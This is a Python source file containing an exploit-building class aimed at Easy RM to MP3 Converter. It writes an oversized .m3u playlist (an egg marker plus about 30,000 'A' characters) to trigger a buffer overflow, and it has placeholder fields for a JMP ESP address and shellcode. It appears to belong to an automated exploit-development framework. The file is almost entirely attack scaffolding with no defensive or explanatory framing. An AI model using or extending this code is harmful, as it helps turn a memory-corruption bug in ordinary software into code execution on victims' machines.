import socket, sys, struct, subprocess, os
from threading import Thread
from functools import wraps
from time import sleep

def run_async(func):
	"""
	function decorator, intended to make "func" run in a separate thread (asynchronously).
	@return: the created Thread object

	E.g.:
	@run_async
	def task1():
		do_something

	@run_async
	def task2():
		do_something_too

	t1 = task1()
	t2 = task2()
	...
	t1.join()
	t2.join()
	"""
	@wraps(func)
	def async_func(*args, **kwargs):
		func_hl = Thread(target = func, args = args, kwargs = kwargs)
		func_hl.start()
		return func_hl

	return async_func

class Exploit():
	"""
	class that contains the exploit, and that can be used to build it
	"""
	def __init__(self):
		self.egg = 'EGGG'
		self.shellcode = ''
		self.jmpesp = ''
		self.prebuff = ''
		self.postbuff = ''
		self.buffer = [self.egg*2, "A"*30090]
		self.file_based = True
		self.filename = 'c:\\autoexploit\\list.m3u'
		self.command = 'C:\\Program Files (x86)\\Easy RM to MP3 Converter\\RM2MP3Converter.exe /cf'

	@run_async
	def exploit(self):
		"""
		This function runs the actual exploit
		"""
		f = open(self.filename,'w')
		f.write(''.join(self.buffer))
		f.close()
		
	def get_buffer(self):
		return self.buffer
	
	def set_buffer(self,buff):
		self.buffer = buff
		
	def get_buffer_length(self):
		return len(''.join(self.buffer))
	
	def get_egg(self):
		return self.egg
	
	def set_egg(self,egg):
		self.egg = egg

	def get_filename(self):
		return self.filename
	
	def set_filename(self,filename):
		self.filename = filename
	
	def is_filebased(self):
		return self.file_based

	def get_command(self):
		return self.command + ' ' + self.filename
	
	def save(self):
		pass